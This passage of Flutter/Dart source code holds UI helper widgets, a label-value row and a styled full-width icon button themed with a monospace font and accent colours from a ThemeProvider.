      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          SizedBox(
            width: 90,
            child: Text(label, style: TextStyle(color: theme.accentColor, fontSize: 10, fontFamily: 'ShareTechMono')),
          ),
          Expanded(
            child: Text(value, style: const TextStyle(color: Colors.white, fontSize: 11, fontFamily: 'ShareTechMono')),
          ),
        ],
      ),
    );
  }

  Widget _bigBtn({
    required IconData icon,
    required String label,
    required Color color,
    required Color textColor,
    VoidCallback? onPressed,
  }) {
    final theme = Provider.of<ThemeProvider>(context, listen: false);
    return SizedBox(
      width: double.infinity,
      height: 52,
      child: Container(
        decoration: BoxDecoration(
          color: const Color(0xFF0A0A10),
          border: Border(
            left: BorderSide(color: color.withOpacity(0.5), width: 1.5),
            top: BorderSide(color: color.withOpacity(0.1)),
            right: BorderSide(color: theme.accentColor.withOpacity(0.06)),
            bottom: BorderSide(color: theme.accentColor.withOpacity(0.15)),
          ),
        ),
        child: Material(
          color: Colors.transparent,
          child: InkWell(
            onTap: onPressed,
            child: Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Icon(icon, color: color, size: 20),
                const SizedBox(width: 10),
                Text(label, style: TextStyle(
                  color: color, fontSize: 12, fontFamily: 'ShareTechMono', letterSpacing: 1,
                )),
              ],
            ),
          ),
        ),
      ),
    );
  }
}
